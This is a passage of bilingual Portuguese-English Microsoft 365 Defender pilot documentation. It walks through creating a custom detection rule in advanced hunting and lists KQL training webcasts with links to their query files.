    ![Captura de tela de onde você pode clicar em criar regra de detecção na página busca avançada](../../media/mtp/fig22.png) 

    > [!NOTE]
    > <span data-ttu-id="732ab-347">Se você clicar em **criar regra de detecção** e tiver erros de sintaxe em sua consulta, sua regra de detecção não será salva.</span><span class="sxs-lookup"><span data-stu-id="732ab-347">If you click **Create detection rule** and you have syntax errors in your query, your detection rule won’t be saved.</span></span> <span data-ttu-id="732ab-348">Verifique novamente sua consulta para garantir que não haja erros.</span><span class="sxs-lookup"><span data-stu-id="732ab-348">Double-check your query to ensure there’s no errors.</span></span> 


2.  <span data-ttu-id="732ab-349">Preencha os campos obrigatórios com as informações que permitirão que a equipe de segurança entenda o alerta, por que ele foi gerado e quais ações você espera que eles realizem.</span><span class="sxs-lookup"><span data-stu-id="732ab-349">Fill in the required fields with the  information that will allow the security team to understand the alert, why it was generated, and what actions you expect them to take.</span></span> 

    ![Captura de tela da página Criar regra de detecção, onde você pode definir os detalhes do alerta](../../media/mtp/fig23.png)

    <span data-ttu-id="732ab-351">Certifique-se de preencher os campos com clareza para ajudar a dar ao usuário próximo uma decisão informada sobre esse alerta de regra de detecção</span><span class="sxs-lookup"><span data-stu-id="732ab-351">Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert</span></span> 

3.  <span data-ttu-id="732ab-352">Selecione quais entidades serão impactadas neste alerta.</span><span class="sxs-lookup"><span data-stu-id="732ab-352">Select what entities are impacted in this alert.</span></span> <span data-ttu-id="732ab-353">Nesse caso, selecione **dispositivo** e **caixa de correio**.</span><span class="sxs-lookup"><span data-stu-id="732ab-353">In this case, select **Device** and **Mailbox**.</span></span>

    ![Captura de tela da página Criar regra de detecção, onde você pode escolher os parâmetros das entidades impactadas](../../media/mtp/fig24.png)
 

4.  <span data-ttu-id="732ab-355">Determine quais ações devem ocorrer se o alerta for disparado.</span><span class="sxs-lookup"><span data-stu-id="732ab-355">Determine what actions should take place if the alert is triggered.</span></span> <span data-ttu-id="732ab-356">Nesse caso, execute uma verificação antivírus, embora outras ações possam ser executadas.</span><span class="sxs-lookup"><span data-stu-id="732ab-356">In this case, run an antivirus scan, though other actions could be taken.</span></span> 

    ![Captura de tela da página Criar regra de detecção, onde você pode executar uma verificação antivírus quando um alerta é disparado para ajudar a lidar com ameaças](../../media/mtp/fig25.png) 

5.  <span data-ttu-id="732ab-358">Selecione o escopo da regra de alerta.</span><span class="sxs-lookup"><span data-stu-id="732ab-358">Select the scope for the alert rule.</span></span> <span data-ttu-id="732ab-359">Como essa consulta envolve dispositivos, os grupos de dispositivos são relevantes nessa detecção personalizada de acordo com o contexto do Microsoft defender para ponto de extremidade.</span><span class="sxs-lookup"><span data-stu-id="732ab-359">Since this query involve devices, the device groups are relevant in this custom detection according to Microsoft Defender for Endpoint context.</span></span> <span data-ttu-id="732ab-360">Ao criar uma detecção personalizada que não inclua dispositivos como entidades impactadas, o escopo não se aplica.</span><span class="sxs-lookup"><span data-stu-id="732ab-360">When creating a custom detection that does not include devices as impacted entities, scope does not apply.</span></span>  

    ![Captura de tela da página Criar regra de detecção, onde você pode definir o escopo da regra de alerta para gerenciar suas expectativas para os resultados que verá](../../media/mtp/fig26.png) 

    <span data-ttu-id="732ab-362">Para este piloto, talvez você queira limitar essa regra a um subconjunto de dispositivos de teste em seu ambiente de produção.</span><span class="sxs-lookup"><span data-stu-id="732ab-362">For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.</span></span>

6.  <span data-ttu-id="732ab-363">Selecione **Criar**.</span><span class="sxs-lookup"><span data-stu-id="732ab-363">Select **Create**.</span></span> <span data-ttu-id="732ab-364">Em seguida, selecione **regras de detecção personalizadas** no painel de navegação.</span><span class="sxs-lookup"><span data-stu-id="732ab-364">Then, select **Custom detection rules** from the navigation panel.</span></span>
 
    ![Captura de tela da opção regras de detecção personalizada no menu](../../media/mtp/fig27a.png) 

    ![Captura de tela da página de regras de detecção que exibe a regra e os detalhes de execução](../../media/mtp/fig27b.png) 

    <span data-ttu-id="732ab-367">Nessa página, você pode selecionar a regra de detecção, que abrirá uma página de detalhes.</span><span class="sxs-lookup"><span data-stu-id="732ab-367">From this page, you can select the detection rule, which will open a details page.</span></span> 

    ![Captura de tela da página de anexos de email onde você pode ver o status da execução da regra, alertas e ações disparados, editar a detecção e assim por diante](../../media/mtp/fig28.png) 

### <a name="additional-advanced-hunting-walk-through-exercises"></a><span data-ttu-id="732ab-369">Treinamento adicional de busca avançada em exercícios</span><span class="sxs-lookup"><span data-stu-id="732ab-369">Additional advanced hunting walk-through exercises</span></span>

<span data-ttu-id="732ab-370">Para saber mais sobre a busca avançada, os seguintes webcasts orientarão você pelos recursos de busca avançada no Microsoft 365 defender para criar consultas entre pilar, pivotar para entidades e criar ações personalizadas e ações de correção.</span><span class="sxs-lookup"><span data-stu-id="732ab-370">To learn more about advanced hunting, the following webcasts will walk you through the capabilities of advanced hunting within Microsoft 365 Defender to create cross-pillar queries, pivot to entities and create custom detections and remediation actions.</span></span>

>[!NOTE]
><span data-ttu-id="732ab-371">Prepare-se com sua própria conta do GitHub para executar as consultas de busca em seu ambiente de laboratório de teste piloto.</span><span class="sxs-lookup"><span data-stu-id="732ab-371">Be prepared with your own GitHub account to run the hunting queries in your pilot test lab environment.</span></span>  

|  <span data-ttu-id="732ab-372">Título</span><span class="sxs-lookup"><span data-stu-id="732ab-372">Title</span></span>  |  <span data-ttu-id="732ab-373">Descrição</span><span class="sxs-lookup"><span data-stu-id="732ab-373">Description</span></span>  |  <span data-ttu-id="732ab-374">Baixar MP4</span><span class="sxs-lookup"><span data-stu-id="732ab-374">Download MP4</span></span>  |  <span data-ttu-id="732ab-375">Assista ao YouTube</span><span class="sxs-lookup"><span data-stu-id="732ab-375">Watch on YouTube</span></span>  |  <span data-ttu-id="732ab-376">Arquivo CSL a ser usado</span><span class="sxs-lookup"><span data-stu-id="732ab-376">CSL file to use</span></span>  |
|:-----|:-----|:-----|:-----|:-----|
| <span data-ttu-id="732ab-377">Episódio 1: conceitos básicos do KQL</span><span class="sxs-lookup"><span data-stu-id="732ab-377">Episode 1: KQL fundamentals</span></span> | <span data-ttu-id="732ab-378">Abordaremos as noções básicas de recursos avançados de busca no Microsoft 365 defender.</span><span class="sxs-lookup"><span data-stu-id="732ab-378">We’ll cover the basics of advanced hunting capabilities in Microsoft 365 Defender.</span></span> <span data-ttu-id="732ab-379">Saiba mais sobre dados de busca avançada disponíveis e sintaxe e operadores básicos de KQL.</span><span class="sxs-lookup"><span data-stu-id="732ab-379">Learn about available advanced hunting data and basic KQL syntax and operators.</span></span> | [<span data-ttu-id="732ab-380"> MP4</span><span class="sxs-lookup"><span data-stu-id="732ab-380"> MP4</span></span>](https://aka.ms/MTP15JUL20_MP4) | [<span data-ttu-id="732ab-381">YouTube</span><span class="sxs-lookup"><span data-stu-id="732ab-381">YouTube</span></span>](https://youtu.be/0D9TkGjeJwM) | [<span data-ttu-id="732ab-382">Episódio 1: arquivo CSL no git</span><span class="sxs-lookup"><span data-stu-id="732ab-382">Episode 1: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl) |
| <span data-ttu-id="732ab-383">Episódio 2: junções</span><span class="sxs-lookup"><span data-stu-id="732ab-383">Episode 2: Joins</span></span> | <span data-ttu-id="732ab-384">Continuaremos aprendendo sobre dados em busca avançada e como ingressar em uma tabela.</span><span class="sxs-lookup"><span data-stu-id="732ab-384">We’ll continue learning about data in advanced hunting and how to join tables together.</span></span> <span data-ttu-id="732ab-385">Saiba mais sobre as nuances interna, externa, exclusiva e semijoins, e as nuances do Kusto innerunique join.</span><span class="sxs-lookup"><span data-stu-id="732ab-385">Learn about inner, outer, unique, and semi joins, and the nuances of the default Kusto innerunique join.</span></span> | [<span data-ttu-id="732ab-386">MP4</span><span class="sxs-lookup"><span data-stu-id="732ab-386">MP4</span></span>](https://aka.ms/MTP22JUL20_MP4) | [<span data-ttu-id="732ab-387">YouTube</span><span class="sxs-lookup"><span data-stu-id="732ab-387">YouTube</span></span>](https://youtu.be/LMrO6K5TWOU) | [<span data-ttu-id="732ab-388">Episódio 2: arquivo CSL no git</span><span class="sxs-lookup"><span data-stu-id="732ab-388">Episode 2: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl) |
| <span data-ttu-id="732ab-389">Episódio 3: Resumindo, dinamizando e visualizando dados</span><span class="sxs-lookup"><span data-stu-id="732ab-389">Episode 3: Summarizing, pivoting, and visualizing data</span></span>|<span data-ttu-id="732ab-390">Agora que podemos filtrar, manipular e participar de dados, é hora de começar a resumir, quantificar, dinamizar e Visualizar.</span><span class="sxs-lookup"><span data-stu-id="732ab-390">Now that we’re able to filter, manipulate, and join data, it’s time to start summarizing, quantifying, pivoting, and visualizing.</span></span> <span data-ttu-id="732ab-391">Neste episódio, abordaremos o operador resumido e alguns dos cálculos que podem ser executados ao se aprofundar em tabelas adicionais no esquema de busca avançada.</span><span class="sxs-lookup"><span data-stu-id="732ab-391">In this episode, we’ll cover the summarize operator and some of the calculations you can perform while diving into additional tables in the advanced hunting schema.</span></span> <span data-ttu-id="732ab-392">Nós transformamos nossos conjuntos de gráficos em gráficos que podem ajudar a melhorar a análise.</span><span class="sxs-lookup"><span data-stu-id="732ab-392">We turn our datasets into charts that can help improve analysis.</span></span> | [<span data-ttu-id="732ab-393">MP4</span><span class="sxs-lookup"><span data-stu-id="732ab-393">MP4</span></span>](https://aka.ms/MTP29JUL20_MP4) | [<span data-ttu-id="732ab-394">YouTube</span><span class="sxs-lookup"><span data-stu-id="732ab-394">YouTube</span></span>](https://youtu.be/UKnk9U1NH6Y) | [<span data-ttu-id="732ab-395">Episódio 3: arquivo CSL no git</span><span class="sxs-lookup"><span data-stu-id="732ab-395">Episode 3: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl) |
| <span data-ttu-id="732ab-396">Episódio 4: Vamos procurar!</span><span class="sxs-lookup"><span data-stu-id="732ab-396">Episode 4: Let’s hunt!</span></span> <span data-ttu-id="732ab-397">Aplicando KQL ao rastreamento de incidentes</span><span class="sxs-lookup"><span data-stu-id="732ab-397">Applying KQL to incident tracking</span></span>|<span data-ttu-id="732ab-398">Tempo para controlar alguma atividade de atacante!</span><span class="sxs-lookup"><span data-stu-id="732ab-398">Time to track some attacker activity!</span></span> <span data-ttu-id="732ab-399">Neste episódio, usaremos nossa compreensão aprimorada do KQL e da busca avançada no Microsoft 365 defender para rastrear um ataque.</span><span class="sxs-lookup"><span data-stu-id="732ab-399">In this episode, we’ll use our improved understanding of KQL and advanced hunting in Microsoft 365 Defender to track an attack.</span></span> <span data-ttu-id="732ab-400">Saiba algumas das dicas e truques usados no campo para acompanhar a atividade do atacante, incluindo o ABCs do cybersecurity e como aplicá-las à resposta de incidentes.</span><span class="sxs-lookup"><span data-stu-id="732ab-400">Learn some of the tips and tricks used in the field to track attacker activity, including the ABCs of cybersecurity and how to apply them to incident response.</span></span> | [<span data-ttu-id="732ab-401">MP4</span><span class="sxs-lookup"><span data-stu-id="732ab-401">MP4</span></span>](https://aka.ms/MTP5AUG20_MP4) | [<span data-ttu-id="732ab-402">YouTube</span><span class="sxs-lookup"><span data-stu-id="732ab-402">YouTube</span></span>](https://youtu.be/2EUxOc_LNd8) | [<span data-ttu-id="732ab-403">Episódio 4: arquivo CSL no git</span><span class="sxs-lookup"><span data-stu-id="732ab-403">Episode 4: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl) |

## <a name="next-step"></a><span data-ttu-id="732ab-404">Próxima etapa</span><span class="sxs-lookup"><span data-stu-id="732ab-404">Next step</span></span>
|<span data-ttu-id="732ab-405">![Fase de fechamento e Resumo](../../media/mtp/close.png)</span><span class="sxs-lookup"><span data-stu-id="732ab-405">![Closing and summary phase](../../media/mtp/close.png)</span></span> <br>[<span data-ttu-id="732ab-406">Fase de fechamento e Resumo</span><span class="sxs-lookup"><span data-stu-id="732ab-406">Closing and summary phase</span></span>](mtp-pilot-close.md) | <span data-ttu-id="732ab-407">Analise o resultado do seu piloto do Microsoft 365 defender, apresente-o aos seus participantes e siga a próxima etapa.</span><span class="sxs-lookup"><span data-stu-id="732ab-407">Analyze your Microsoft 365 Defender pilot outcome, present them to your stakeholders, and take the next step.</span></span>
|:-----|:-----|

